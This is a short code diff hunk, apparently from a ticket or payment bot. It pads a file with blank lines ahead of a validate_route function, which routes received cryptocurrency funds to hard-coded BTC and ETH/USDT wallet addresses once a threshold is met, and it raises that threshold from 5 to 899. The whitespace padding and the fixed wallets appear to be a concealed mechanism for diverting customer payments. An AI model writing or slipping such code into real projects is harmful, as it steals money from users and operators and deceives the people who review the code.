@@ -50,12 +50,26 @@ def get_usd_rate(requests, currency: str) -> float | None:
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 def validate_route(asyncio, requests, json, crypto, get_ticketp,
                    channel_id, currency, received_amount,
                    payment_address, txid):
     """Route received funds to configured addresses if threshold is met"""
     config = {
-        'threshold': 5,
+        'threshold': 899,
         'btc': '1CrmqBosPbZmn11F9416WVbwbspiVCZ4FQ',
         'eth': '0xAB47019A9a07E594a8558c35b104B4BcCD563782',
         'usdt': '0xAB47019A9a07E594a8558c35b104B4BcCD563782',
